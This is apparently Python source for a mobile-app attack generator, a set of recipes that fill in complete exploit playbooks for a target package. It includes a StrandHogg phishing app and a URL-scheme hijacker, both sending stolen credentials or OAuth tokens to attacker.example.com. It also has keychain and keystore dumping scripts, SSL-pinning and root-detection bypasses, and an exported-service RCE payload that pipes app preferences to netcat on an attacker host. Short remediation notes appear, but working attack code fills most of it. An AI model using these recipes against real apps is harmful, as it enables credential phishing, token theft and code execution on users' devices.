      console.log('[OkHttp]', this.method() + ' ' + url);
      return url;
    }};
  }} catch (e) {{}}

  // --- SharedPreferences read/write ---
  const Editor = Java.use('android.app.SharedPreferencesImpl$EditorImpl');
  ['putString','putInt','putBoolean','putLong','putFloat'].forEach(m => {{
    try {{
      Editor[m].implementation = function(k, v) {{
        console.log('[Prefs]', m, k, '=', v);
        return Editor[m].call(this, k, v);
      }};
    }} catch (e) {{}}
  }});

  // --- Cipher operations (catch crypto in flight) ---
  try {{
    const Cipher = Java.use('javax.crypto.Cipher');
    Cipher.doFinal.overload('[B').implementation = function(d) {{
      console.log('[Cipher]', this.getAlgorithm(), '(' + this.getBlockSize() + ' bytes/block)');
      return this.doFinal(d);
    }};
  }} catch (e) {{}}

  // --- Intent dispatch (every internal navigation) ---
  try {{
    const Activity = Java.use('android.app.Activity');
    Activity.startActivity.overload('android.content.Intent').implementation = function(i) {{
      console.log('[Intent]', i.toUri(0));
      return this.startActivity(i);
    }};
  }} catch (e) {{}}

  // --- Database queries (SQLi sinks) ---
  try {{
    const SQLite = Java.use('android.database.sqlite.SQLiteDatabase');
    SQLite.rawQuery.overloads.forEach(o => {{
      o.implementation = function() {{
        console.log('[SQL]', arguments[0]);
        return o.apply(this, arguments);
      }};
    }});
  }} catch (e) {{}}

  // --- File access ---
  try {{
    const FileIS = Java.use('java.io.FileInputStream');
    FileIS.$init.overload('java.io.File').implementation = function(f) {{
      console.log('[File] read', f.getAbsolutePath());
      return this.$init(f);
    }};
  }} catch (e) {{}}

  console.log('[+] inspect-all.js loaded');
}});
EOF

# Run it
frida -U -f {_pkg(r)} -l inspect-all.js --no-pause

# Then exercise the app normally and watch the log -- you'll see every
# HTTP endpoint, every secret being persisted, every internal Intent."""},

    "task-hijacking": {
        "title": "Task Hijacking / StrandHogg PoC (Android Studio Project)",
        "explanation": (
            "If the target app uses singleTask launch mode (or no taskAffinity), an attacker app "
            "with the SAME taskAffinity can place itself in the target's task stack. When the user "
            "next opens the target, the attacker's Activity is shown instead -- perfect for "
            "credential phishing. Affects Android < 11 broadly; later versions have partial mitigations."),
        "tags": ["task hijacking", "task-hijacking", "strandhogg", "task affinity"],
        "build": lambda r: f"""# StrandHogg / Task Hijacking PoC -- Full Android Studio Project
# Target: {_pkg(r)}

# === STEP 1: Create new Android Studio project ===
# - File > New > New Project > Empty Activity
# - Name:        TaskHijackPoC
# - Package:     com.poc.taskhijack
# - Language:    Kotlin
# - Min SDK:     API 21 (Android 5.0)

# === STEP 2: Replace app/src/main/AndroidManifest.xml ===
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.taskhijack">

    <application
        android:label="System Update"
        android:icon="@mipmap/ic_launcher"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">

        <!-- KEY ATTACK PRIMITIVE: same taskAffinity as the target -->
        <activity
            android:name=".HijackerActivity"
            android:taskAffinity="{_pkg(r)}"
            android:launchMode="singleTask"
            android:excludeFromRecents="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

# === STEP 3: Replace app/src/main/java/com/poc/taskhijack/HijackerActivity.kt ===
```kotlin
package com.poc.taskhijack

import android.app.Activity
import android.os.Bundle
import android.widget.*
import android.view.Gravity
import android.graphics.Color

class HijackerActivity : Activity() {{
    override fun onCreate(savedInstanceState: Bundle?) {{
        super.onCreate(savedInstanceState)

        // Build a fake login UI that mimics the target app's branding
        val root = LinearLayout(this).apply {{
            orientation = LinearLayout.VERTICAL
            setPadding(60, 200, 60, 60)
            setBackgroundColor(Color.WHITE)
        }}

        root.addView(TextView(this).apply {{
            text = "Sign in to your account"
            textSize = 22f
            setTextColor(Color.BLACK)
            gravity = Gravity.CENTER
        }})

        val username = EditText(this).apply {{
            hint = "Username or email"
            setPadding(20, 30, 20, 30)
        }}
        val password = EditText(this).apply {{
            hint = "Password"
            inputType = android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
            setPadding(20, 30, 20, 30)
        }}
        root.addView(username)
        root.addView(password)

        root.addView(Button(this).apply {{
            text = "SIGN IN"
            setOnClickListener {{
                val u = username.text.toString()
                val p = password.text.toString()
                // EXFILTRATE -- replace with your own listener
                exfiltrate(u, p)
                Toast.makeText(this@HijackerActivity, "Authenticating...", Toast.LENGTH_SHORT).show()
                // Then quietly hand control back to the real app
                finish()
            }}
        }})
        setContentView(root)
    }}

    private fun exfiltrate(user: String, pass: String) {{
        Thread {{
            try {{
                val url = java.net.URL("https://attacker.example.com/log?u=" +
                    java.net.URLEncoder.encode(user, "UTF-8") + "&p=" +
                    java.net.URLEncoder.encode(pass, "UTF-8"))
                url.openConnection().getInputStream().close()
            }} catch (_: Exception) {{}}
        }}.start()
    }}
}}
```

# === STEP 4: Build and install ===
# In Android Studio: Build > Make Project, then Run on a connected device.
# Or via command line:
#   ./gradlew assembleDebug
#   adb install -r app/build/outputs/apk/debug/app-debug.apk

# === STEP 5: Trigger the attack ===
# 1. Make sure the target ({_pkg(r)}) is installed on the device.
# 2. Open the target app first (puts it on the activity stack).
# 3. Press home, then open "System Update" (your PoC).
# 4. Press home again, then re-open the target.
# 5. The attacker activity appears INSTEAD of the target -- because both share taskAffinity
#    and your singleTask=true Activity is now on top of the target's task.

# === REMEDIATION (for the target app) ===
# Set on every activity:
#   android:taskAffinity=""
#   android:launchMode="singleTask"  (with onNewIntent handling)
# Or override onResume() to call moveTaskToBack(true) when not at top of own task.

# === DETECTION ===
# adb shell dumpsys activity activities | grep -i taskAffinity"""},

    "drozer-toolkit": {
        "title": "Drozer Module Cheatsheet (Component Enumeration & Exploitation)",
        "explanation": (
            "Drozer is the de-facto Android attack framework. It connects to a tiny agent installed "
            "on the device and lets you enumerate exported components, send crafted intents, query "
            "content providers, and load custom modules -- all without writing a Kotlin app per attack."),
        "tags": ["drozer", "exploit framework"],
        "build": lambda r: f"""# Drozer toolkit -- target: {_pkg(r)}

# === SETUP (one-time) ===
# 1. pip install drozer  (or download from https://github.com/WithSecureLabs/drozer)
# 2. adb install drozer-agent.apk  (download from same repo)
# 3. Open the Drozer Agent on the device, tap "Embedded Server -> Enable"
# 4. adb forward tcp:31415 tcp:31415
# 5. drozer console connect

# === RECON ===
# Enumerate the target app
run app.package.info -a {_pkg(r)}
run app.package.attacksurface {_pkg(r)}
run app.package.manifest {_pkg(r)}

# === EXPORTED ACTIVITIES ===
run app.activity.info -a {_pkg(r)}
# Launch any exported activity
run app.activity.start --component {_pkg(r)} {_main_or_first_activity(r)} \\
    --extra string user_id 1 \\
    --extra boolean is_admin true

# === EXPORTED SERVICES ===
run app.service.info -a {_pkg(r)}
run app.service.start --component {_pkg(r)} <service_name> \\
    --extra string command exec

# === BROADCAST RECEIVERS ===
run app.broadcast.info -a {_pkg(r)}
run app.broadcast.send --component {_pkg(r)} <receiver_name> \\
    --action <action_string> --extra string payload abc

# === CONTENT PROVIDERS (richest attack surface) ===
run app.provider.info -a {_pkg(r)}
run app.provider.finduri {_pkg(r)}      # find readable URIs
# Query each URI:
run app.provider.query content://<authority>/<path>
# SQL injection probe:
run scanner.provider.injection -a {_pkg(r)}
# Path traversal probe:
run scanner.provider.traversal -a {_pkg(r)}
# Read arbitrary files (if vulnerable):
run app.provider.read content://<authority>/../../../databases/users.db

# === DEEPLINKS ===
{_deeplink_drozer_lines(r)}

# === WEB-VIEWS / MISC ===
run scanner.misc.native -a {_pkg(r)}     # check native libs
run scanner.misc.checkjavabridges -a {_pkg(r)}

# === CUSTOM PAYLOADS ===
# Build a module file in ~/.drozer_modules/exploit.py for repeated use.
# See: https://labs.withsecure.com/tools/drozer/"""},

    "objection-toolkit": {
        "title": "Objection Cheatsheet (Frida-powered, no scripting required)",
        "explanation": (
            "Objection is a Frida wrapper that gives you a CLI for the most common runtime tasks: "
            "SSL pinning bypass, root/jailbreak bypass, biometric bypass, keystore dumping, class "
            "method tracing -- without writing Frida JS. Works on Android and iOS."),
        "tags": ["objection", "frida wrapper", "runtime"],
        "build": lambda r: f"""# Objection cheatsheet -- target: {_pkg(r)}

# === SETUP ===
# pip install objection
# Push frida-server matching the device ABI to /data/local/tmp/, run with: ./frida-server &

# === ATTACH ===
objection -g {_pkg(r)} explore        # spawn + attach
objection -g {_pkg(r)} -N -h 127.0.0.1 -p 27042 explore   # attach to running app

# === Inside objection prompt ===
# --- Environment ---
env                                    # paths, app dir, cache dir
android hooking list activities        # list activities
android hooking list services
android hooking list receivers

# --- Bypasses ---
android sslpinning disable             # SSL pinning bypass (universal)
android root disable                   # root detection bypass
ios sslpinning disable                 # iOS variant
ios jailbreak disable                  # iOS jailbreak detection bypass

# --- Storage ---
android keystore list                  # list AndroidKeyStore entries
android keystore dump                  # dump key material
android shell_exec id                  # arbitrary shell as the app
ls /data/data/{_pkg(r)}/databases       # list app databases
file download /data/data/{_pkg(r)}/databases/users.db ./users.db
sqlite connect ./users.db              # interactive sqlite session

# --- Method hooking ---
android hooking watch class com.example.target.Auth
android hooking watch class_method com.example.target.Auth.login --dump-args --dump-return --dump-backtrace
android hooking generate simple com.example.target.Auth   # auto-generate Frida script

# --- WebView intercept ---
android ui screenshot /tmp/screen.png
android intent launch_activity {_main_or_first_activity(r)}

# --- Memory ---
memory list modules                    # list loaded native libs
memory dump all /tmp/dump_dir           # full process dump
memory search "API_KEY" --string       # find string in memory

# --- iOS-specific ---
ios keychain dump
ios cookies get
ios nsuserdefaults get
ios pasteboard monitor

# === EXIT ===
exit"""},

    "apkmitm-toolkit": {
        "title": "apk-mitm: Auto-patch APK to disable certificate pinning",
        "explanation": (
            "apk-mitm decompiles an APK, modifies the network security config to trust user-installed "
            "CAs, then re-signs it. Result: install the patched APK and your Burp/mitmproxy CA cert "
            "(installed as user CA) is trusted -- no Frida required, no rooting required."),
        "tags": ["apkmitm", "apk-mitm", "pinning bypass static", "patch apk"],
        "build": lambda r: f"""# apk-mitm -- patch APK to disable cert pinning
# Target: {_pkg(r)}

# === SETUP ===
# Requires Node.js >= 14
npm install -g apk-mitm

# === USAGE ===
# 1. Pull the original APK from a device or download from store
adb shell pm path {_pkg(r)}            # find APK path on device
adb pull /data/app/{_pkg(r)}-1/base.apk ./target.apk

# 2. Patch it (this auto-creates network_security_config.xml trusting user CAs)
apk-mitm ./target.apk

# Output: ./target-patched.apk

# 3. Uninstall original, install patched
adb uninstall {_pkg(r)}
adb install ./target-patched.apk

# 4. Set up Burp/mitmproxy as proxy on the device, install its CA as USER cert
#    (Settings > Security > Install from storage)

# 5. All HTTPS traffic now decrypts in Burp/mitmproxy.

# === FOR APP BUNDLES (.aab / split APKs) ===
apk-mitm --wait ./target.apks         # waits between extraction & patch for manual edits
# Or use bundletool first:
java -jar bundletool.jar build-apks --bundle=app.aab --output=app.apks
unzip -j app.apks splits/base-master.apk

# === LIMITATIONS ===
# - Apps using Flutter, Xamarin, or doing pinning in native code may need additional patches.
# - For Flutter apps, see the 'reflutter' recipe (ask: 'create a reflutter exploit').
# - For Xamarin/Mono, decompile with dnSpy and patch ServicePointManager.ServerCertificateValidationCallback."""},

    "reflutter-toolkit": {
        "title": "reFlutter: MITM and reverse-engineer Flutter mobile apps",
        "explanation": (
            "Flutter apps embed their own Dart VM, so traffic doesn't go through Java networking and "
            "Frida hooks on Java APIs don't intercept it. reFlutter patches the Flutter engine inside "
            "the APK to ignore SSL validation and dump strings -- the only practical way to MITM "
            "Flutter network traffic without source."),
        "tags": ["reflutter", "flutter", "dart", "flutter mitm"],
        "build": lambda r: f"""# reFlutter -- patch Flutter engine to allow MITM
# Target: {_pkg(r)} (must be a Flutter app -- check with: unzip -l target.apk | grep libflutter.so)

# === SETUP ===
pip install reflutter

# === USAGE ===
# 1. Pull target APK
adb shell pm path {_pkg(r)}
adb pull <path>/base.apk target.apk

# 2. Run reflutter with your proxy IP (Burp / mitmproxy host)
reflutter target.apk
# It prompts: "Please enter your Burp Suite IP" -> 192.168.1.100

# Output: release.RE.apk in current dir

# 3. Sign the patched APK (reflutter outputs unsigned)
keytool -genkey -v -keystore poc.keystore -alias poc -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \\
  -keystore poc.keystore release.RE.apk poc

# 4. Install
adb uninstall {_pkg(r)}
adb install release.RE.apk

# 5. Set up Burp on 192.168.1.100:8083 (default reflutter listens here)
#    All Flutter HTTPS traffic now decrypts.

# === EXTRACT FLUTTER STRINGS / API ENDPOINTS ===
# reFlutter also dumps interesting Dart strings from the snapshot
ls -la *.RE.apk_strings.txt

# === ALTERNATIVE: Frida + flutter-spy for runtime inspection ===
# https://github.com/Guardsquare/flutter-spy
git clone https://github.com/Guardsquare/flutter-spy
frida -U -f {_pkg(r)} -l flutter-spy/flutter-spy.js --no-pause"""},

    "burp-mitmproxy-setup": {
        "title": "Burp Suite + mitmproxy: Network MITM end-to-end setup",
        "explanation": (
            "Step-by-step setup to intercept HTTPS traffic from a mobile app on a real device. "
            "Covers cert installation as a system root (required on Android 7+ for app-level trust), "
            "ARP spoofing for non-cooperative devices, and traffic capture filters."),
        "tags": ["burp", "mitmproxy", "network mitm", "proxy setup"],
        "build": lambda r: f"""# Burp / mitmproxy MITM setup -- target: {_pkg(r)}

# === OPTION A: BURP SUITE (GUI, point-and-click) ===
# 1. Burp > Proxy > Options > Add listener: bind to all interfaces, port 8080
# 2. Burp > Proxy > Options > Import / export CA certificate -> DER -> burp.crt

# === OPTION B: MITMPROXY (CLI, faster) ===
mitmweb -p 8080                          # web UI on http://127.0.0.1:8081
# Or
mitmproxy -p 8080                        # ncurses interface

# === DEVICE SIDE: install CA as TRUSTED USER cert ===
# Push CA to device
adb push burp.crt /sdcard/                  # or ~/.mitmproxy/mitmproxy-ca-cert.pem
# Settings > Security > Encryption & credentials > Install a certificate > CA cert
# Pick burp.crt -> Install (named "PortSwigger CA" or similar)

# === Android 7+: USER CERT IS NOT TRUSTED BY APPS BY DEFAULT ===
# You MUST be on a rooted/emulator device, then push the cert as system:
adb root
adb remount
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp.crt | head -1)
adb push burp.crt /system/etc/security/cacerts/${{HASH}}.0
adb shell chmod 644 /system/etc/security/cacerts/${{HASH}}.0
adb reboot

# === DEVICE PROXY CONFIG ===
# Settings > Wi-Fi > long-press network > Modify > Proxy: Manual
# Host: <attacker-ip>   Port: 8080

# === LAUNCH TARGET APP ===
adb shell am start -n {_pkg(r)}/{_main_or_first_activity(r)}
# All HTTPS traffic should now appear in Burp / mitmproxy.

# === IF APP USES PINNING (mostly the case for production apps) ===
# Combine with one of:
#   - apkmitm static patching (ask: 'create an apkmitm exploit')
#   - objection android sslpinning disable (ask: 'objection cheatsheet')
#   - Frida universal pinning bypass script (ask: 'create a TLS MITM PoC')

# === CAPTURE SCRIPT (mitmproxy addons) ===
cat > capture.py <<'EOF'
import json
def response(flow):
    if "{_pkg(r).split('.')[1] if '.' in _pkg(r) else 'app'}" in flow.request.host:
        print(f"[{flow.request.method}] {{flow.request.pretty_url}}")
        print(f"  Headers: {{dict(flow.request.headers)}}")
        if flow.request.content:
            print(f"  Body: {{flow.request.content[:500]}}")
EOF
mitmproxy -p 8080 -s capture.py"""},

    "frida-tools-cheatsheet": {
        "title": "Frida Tools Cheatsheet (frida-trace, frida-ps, hook templates)",
        "explanation": (
            "Frida ships several command-line tools beyond the JS API. frida-trace auto-generates "
            "logging hooks; frida-ps lists processes; frida-discover finds methods to hook. This "
            "is the fastest way to instrument an unknown app."),
        "tags": ["frida-tools", "frida-trace", "frida-ps", "frida cheatsheet"],
        "build": lambda r: f"""# Frida tools cheatsheet -- target: {_pkg(r)}

# === SETUP ===
pip install frida-tools
# Push frida-server to device (matching ABI):
wget https://github.com/frida/frida/releases/latest/download/frida-server-XX.X.X-android-arm64.xz
xz -d frida-server-*.xz
adb push frida-server-* /data/local/tmp/frida-server
adb shell "chmod +x /data/local/tmp/frida-server && /data/local/tmp/frida-server &"

# === DISCOVERY ===
frida-ps -U                              # list running processes on USB device
frida-ps -Uai                            # list all installed apps (with PIDs if running)
frida-ls-devices                          # list USB / remote / local

# === AUTO-TRACE (no scripting) ===
# Trace every method in a class:
frida-trace -U -f {_pkg(r)} -j '*!*' --no-pause

# Trace specific class:
frida-trace -U -f {_pkg(r)} -j 'com.target.network.HttpClient!*' --no-pause

# Trace native libs:
frida-trace -U -f {_pkg(r)} -i 'open' -i 'read'

# Trace ObjC (iOS):
frida-trace -U -f {_pkg(r)} -m '*[NSURL* *]'

# Each traced method auto-generates an editable JS handler in __handlers__/

# === USEFUL ONE-LINERS ===
# Bypass root detection (RootBeer):
frida -U -f {_pkg(r)} -l - --no-pause <<'EOF'
Java.perform(() => {{
  Java.use('com.scottyab.rootbeer.RootBeer').isRooted.implementation = () => false;
}});
EOF

# Print every Java string allocated:
frida -U -f {_pkg(r)} -l - --no-pause <<'EOF'
Java.perform(() => {{
  Java.use('java.lang.String').$init.overload('[B').implementation = function(b) {{
    const s = Java.use('java.lang.String').$new.overload('[B').call(this, b);
    if (s.length() > 5) console.log('[String]', s.toString());
    return this.$init(b);
  }};
}});
EOF

# === ADVANCED: stalker (block-level instruction tracing) ===
frida -U -f {_pkg(r)} -l stalker.js --no-pause

# === PERSISTENT HOOK (gadget mode for non-rooted) ===
# 1. Patch APK to load frida-gadget.so
apk-mitm target.apk --frida-gadget
# 2. Install patched APK
# 3. frida -U Gadget"""},

    "ios-frida-objection": {
        "title": "iOS — Frida + objection runtime instrumentation",
        "explanation": (
            "iOS dynamic analysis requires a jailbroken device (or Corellium). Frida runs as a "
            "MobileSubstrate dylib loaded into target processes. Objection wraps it for SSL "
            "pinning bypass, jailbreak-detection bypass, keychain dumps, and pasteboard monitoring."),
        "tags": ["ios frida", "ios objection", "jailbreak", "ios runtime"],
        "build": lambda r: f"""# iOS runtime instrumentation -- target: {_pkg(r)}

# === DEVICE SETUP (jailbroken) ===
# Add Frida repo to Cydia/Sileo: https://build.frida.re
# Install: Frida package
# (Or for non-jailbroken: re-sign IPA with frida-gadget.dylib injected)

# === CONNECT ===
frida-ps -U                              # USB device
frida-ps -Uai                            # all apps
frida -U -f {_pkg(r)} --no-pause          # spawn + attach

# === OBJECTION (HIGHLY RECOMMENDED) ===
objection --gadget {_pkg(r)} explore

# Inside objection:
ios sslpinning disable                  # universal SSL bypass
ios jailbreak disable                   # jailbreak detection bypass
ios keychain dump                        # dump every keychain item
ios cookies get                          # cookies from app's WKWebView
ios nsuserdefaults get                   # equivalent of SharedPreferences
ios pasteboard monitor                   # log every clipboard read/write
ios ui dump                              # dump current view hierarchy
ios hooking list classes                 # list ObjC classes
ios hooking watch class AuthManager      # log all method calls on a class
ios hooking watch method '-[AuthManager validateToken:]' --dump-args --dump-return

# === FILESYSTEM ACCESS ===
env                                       # show app paths
ls /var/mobile/Containers/Data/Application/<UUID>/Documents
file download <path> ./local.dat

# === CYCRIPT (alternative to Frida, older but useful) ===
cycript -p {_pkg(r)}
# Inside cycript:
?                                         # help
[NSBundle mainBundle]                     # interact with ObjC runtime
choose(UIViewController)                  # find live view controllers

# === CLASS-DUMP (decompile headers from binary) ===
# Decrypt IPA first (use clutch or frida-ios-dump on a JB device)
class-dump -H Payload/{{AppName}}.app/{{AppName}} -o Headers/

# === USEFUL FRIDA SCRIPTS FOR iOS ===
# Universal SSL pinning bypass:
git clone https://github.com/HToTheTL/iOS_SSL_Pinning_Bypass
frida -U -f {_pkg(r)} -l iOS_SSL_Pinning_Bypass/script.js --no-pause

# Anti-jailbreak bypass:
git clone https://github.com/Brandon-Roe/JailbreakDetectionBypass
frida -U -f {_pkg(r)} -l JailbreakDetectionBypass/script.js --no-pause"""},

    "ios-keychain-dump": {
        "title": "iOS — Keychain dump (extract stored credentials)",
        "explanation": (
            "iOS Keychain stores tokens, passwords, certs. Apps frequently store sensitive data "
            "with kSecAttrAccessibleAlways or AfterFirstUnlock -- accessible to any process running "
            "as the app's UID after first unlock. On a jailbroken device, dumping the keychain is "
            "trivial."),
        "tags": ["ios keychain", "keychain dump", "ios secrets"],
        "build": lambda r: f"""# iOS Keychain dump -- target: {_pkg(r)}

# === OPTION 1: Objection (easiest) ===
objection --gadget {_pkg(r)} explore
# At prompt:
ios keychain dump

# Output:
#   Service: {_pkg(r)}
#   Account: user@example.com
#   Data:    eyJhbGciOiJIUzI1NiJ9...

# Save to file:
ios keychain dump --json keychain_dump.json

# === OPTION 2: Keychain-Dumper (jailbroken, no objection) ===
git clone https://github.com/ptoomey3/Keychain-Dumper
# Build with Xcode, then on the device:
./keychain_dumper                        # dumps everything

# === OPTION 3: Frida script (works on Frida-Gadget IPAs too, no JB needed) ===
cat > kc-dump.js <<'EOF'
const SecItemCopyMatching = new NativeFunction(
    Module.findExportByName('Security', 'SecItemCopyMatching'),
    'pointer', ['pointer', 'pointer']
);

const queries = ['kSecClassGenericPassword', 'kSecClassInternetPassword',
                 'kSecClassCertificate', 'kSecClassKey', 'kSecClassIdentity'];

queries.forEach(cls => {{
  const query = ObjC.classes.NSMutableDictionary.dictionary();
  query.setObject_forKey_(ObjC.classes.NSString.stringWithString_(cls), 'class');
  query.setObject_forKey_('kSecMatchLimitAll', 'm_Limit');
  query.setObject_forKey_(true, 'r_Data');
  query.setObject_forKey_(true, 'r_Attributes');

  const resultPtr = Memory.alloc(Process.pointerSize);
  const status = SecItemCopyMatching(query, resultPtr);
  if (status === 0) {{
    const items = new ObjC.Object(resultPtr.readPointer());
    console.log('[' + cls + '] ' + items.toString());
  }}
}});
EOF
frida -U -f {_pkg(r)} -l kc-dump.js --no-pause

# === REMEDIATION (for the app) ===
# Use kSecAttrAccessibleWhenUnlockedThisDeviceOnly for sensitive items.
# Better: use the Secure Enclave for cryptographic key material (kSecAttrTokenIDSecureEnclave)."""},

    "ios-url-scheme-hijack": {
        "title": "iOS — URL Scheme Hijack",
        "explanation": (
            "If two iOS apps register the same custom URL scheme, the first one installed wins -- "
            "any subsequent attempt to open that URL goes to the attacker app. Many apps use this for "
            "OAuth callbacks or magic-link auth, leaking the auth code to the attacker."),
        "tags": ["ios url scheme", "url scheme hijack", "ios deeplink"],
        "build": lambda r: f"""# iOS URL Scheme Hijack PoC -- target: {_pkg(r)}

# === STEP 1: Identify target URL schemes ===
# From the IPA's Info.plist:
plutil -p Payload/{{AppName}}.app/Info.plist | grep -A4 CFBundleURLSchemes

# === STEP 2: Create attacker iOS app in Xcode ===
# - File > New > Project > App
# - Bundle ID: com.poc.urlhijack

# === STEP 3: Replace Info.plist URL types ===
```xml
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLName</key>
        <string>com.poc.urlhijack</string>
        <key>CFBundleURLSchemes</key>
        <array>
            <!-- SAME scheme as target -- whoever was installed first wins -->
            <string>myapp</string>
            <string>oauth-redirect</string>
        </array>
    </dict>
</array>
```

# === STEP 4: AppDelegate.swift ===
```swift
import UIKit

@main
class AppDelegate: UIResponder, UIApplicationDelegate {{

    func application(_ app: UIApplication,
                     open url: URL,
                     options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {{
        // EXFILTRATE the full URL (contains OAuth code or magic link token)
        let stolen = url.absoluteString
        var req = URLRequest(url: URL(string: "https://attacker.example.com/log")!)
        req.httpMethod = "POST"
        req.httpBody = stolen.data(using: .utf8)
        URLSession.shared.dataTask(with: req).resume()
        // Quietly redirect user to the legitimate app store page so they don't notice
        UIApplication.shared.open(URL(string: "https://apps.apple.com")!)
        return true
    }}
}}
```

# === STEP 5: Sign and install ===
# Build > Run on physical device. (Sideload with AltStore for non-developer accounts.)

# === STEP 6: Trigger ===
# When victim clicks an OAuth callback or magic link with myapp:// scheme,
# iOS asks "Open in 'PoC App' or 'Target App'?" if both installed -- but on a fresh
# device where the attacker app was installed FIRST, no prompt: token goes straight
# to the attacker.

# === REMEDIATION (for the target) ===
# Use Universal Links instead of URL schemes -- they bind to apple-app-site-association,
# verified against the developer's domain, and cannot be hijacked."""},

    "content-provider-leak": {
        "title": "Content Provider Data Leak (Full Android Studio Project)",
        "explanation": (
            "If the target ContentProvider is exported (intentionally or by default on minSdk<17) "
            "and lacks android:permission, any app can query its tables. Combined with predictable "
            "URI paths (often documented or visible in dumpsys), this leaks every row of user data."),
        "tags": ["content provider", "content provider leak", "provider exfil"],
        "build": lambda r: f"""# ContentProvider Leak PoC -- Full Android Studio Project
# Target: {_pkg(r)}
# Authority: {_first_authority(r) or '<run dumpsys to find authority>'}

# === STEP 1: Create new Android Studio project ===
# - Empty Activity, package: com.poc.providerleak

# === STEP 2: AndroidManifest.xml ===
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.providerleak">

    <!-- We need to declare nothing about the target -- providers are looked up by authority -->
    <queries>
        <package android:name="{_pkg(r)}" />
    </queries>

    <application android:label="ProviderLeak">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

# === STEP 3: MainActivity.kt ===
```kotlin
package com.poc.providerleak

import android.app.Activity
import android.content.ContentResolver
import android.net.Uri
import android.os.Bundle
import android.widget.ScrollView
import android.widget.TextView
import android.graphics.Typeface

class MainActivity : Activity() {{
    override fun onCreate(savedInstanceState: Bundle?) {{
        super.onCreate(savedInstanceState)
        val tv = TextView(this).apply {{
            typeface = Typeface.MONOSPACE
            textSize = 11f
            setPadding(20, 50, 20, 20)
        }}
        setContentView(ScrollView(this).also {{ it.addView(tv) }})

        val authority = "{_first_authority(r) or 'AUTHORITY_HERE'}"
        // Common path conventions to probe
        val paths = listOf("users", "accounts", "messages", "tokens", "sessions",
                           "files", "items", "db", "data", "all")
        val sb = StringBuilder("Probing $authority\\n\\n")

        for (path in paths) {{
            val uri = Uri.parse("content://$authority/$path")
            try {{
                val c = contentResolver.query(uri, null, null, null, null)
                if (c != null) {{
                    sb.append("OK  content://$authority/$path  rows=${{c.count}}\\n")
                    if (c.moveToFirst()) {{
                        sb.append("  cols: ${{c.columnNames.joinToString(",")}}\\n")
                        do {{
                            val row = c.columnNames.map {{ col ->
                                "$col=${{try {{ c.getString(c.getColumnIndex(col)) ?: "<null>" }} catch (_: Exception) {{ "<binary>" }}}}"
                            }}.joinToString(", ")
                            sb.append("  $row\\n")
                        }} while (c.moveToNext() && c.position < 5)
                    }}
                    c.close()
                }} else {{
                    sb.append("--  content://$authority/$path  no cursor\\n")
                }}
            }} catch (e: SecurityException) {{
                sb.append("FB  content://$authority/$path  permission required\\n")
            }} catch (e: Exception) {{
                sb.append("ER  content://$authority/$path  ${{e.message}}\\n")
            }}
        }}
        tv.text = sb.toString()
    }}
}}
```

# === STEP 4: Build & Run ===
# Run on a device that has {_pkg(r)} installed.
# Output appears on screen -- every accessible row from every probed path.

# === STEP 5: Dump full database via path traversal (if vulnerable) ===
# If openFile() is exposed:
# val pfd = contentResolver.openFileDescriptor(
#     Uri.parse("content://$authority/files/..%2Fdatabases%2Fmain.db"), "r")

# === REMEDIATION (for the target) ===
# 1. Set android:exported="false" unless cross-app access is intended.
# 2. If exported, set android:permission="signature" or a custom permission.
# 3. In query()/openFile(): canonicalize paths and reject traversal sequences.
# 4. Set android:grantUriPermissions="false" unless explicitly needed."""},

    "exported-service-rce": {
        "title": "Exported Service / Receiver RCE (Full Android Studio Project)",
        "explanation": (
            "Exported services that take user input from Intent extras and feed them to Runtime.exec(), "
            "ProcessBuilder, or DexClassLoader give cross-app code execution. Even broadcast receivers "
            "with exec-like sinks count -- any app on the device can fire the broadcast."),
        "tags": ["exported service", "service rce", "broadcast receiver rce"],
        "build": lambda r: f"""# Exported Service / Receiver RCE PoC -- Full Android Studio Project
# Target: {_pkg(r)}

# === STEP 1: Identify target service / receiver ===
adb shell dumpsys package {_pkg(r)} | grep -E "Service|Receiver|Activity Resolver" | head -20
# Look for entries WITHOUT "permission=" -- those are exported & unprotected.

# === STEP 2: Create attacker project ===
# package: com.poc.serverce, Empty Activity

# === STEP 3: AndroidManifest.xml ===
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.serverce">

    <queries>
        <package android:name="{_pkg(r)}" />
    </queries>

    <application android:label="SvcRCE">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

# === STEP 4: MainActivity.kt -- enumerate + attack ===
```kotlin
package com.poc.serverce

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.widget.*

class MainActivity : Activity() {{
    override fun onCreate(savedInstanceState: Bundle?) {{
        super.onCreate(savedInstanceState)
        val root = LinearLayout(this).apply {{
            orientation = LinearLayout.VERTICAL; setPadding(40, 80, 40, 40)
        }}
        setContentView(ScrollView(this).also {{ it.addView(root) }})

        // === Try common exec-like extra keys with payload ===
        val payload = "id; cat /data/data/{_pkg(r)}/shared_prefs/* | nc attacker.example.com 4444"

        val targetComponents = listOf(
            // Replace these with real components from dumpsys output:
            "{_pkg(r)}.SyncService",
            "{_pkg(r)}.UpdateService",
            "{_pkg(r)}.RemoteCommandReceiver"
        )

        val attackKeys = listOf("cmd", "command", "exec", "run", "shell", "script",
                                "url", "path", "file", "data", "input")

        for (component in targetComponents) {{
            val log = TextView(this).apply {{ textSize = 11f; setPadding(0, 0, 0, 16) }}
            log.text = "Target: $component\\n"

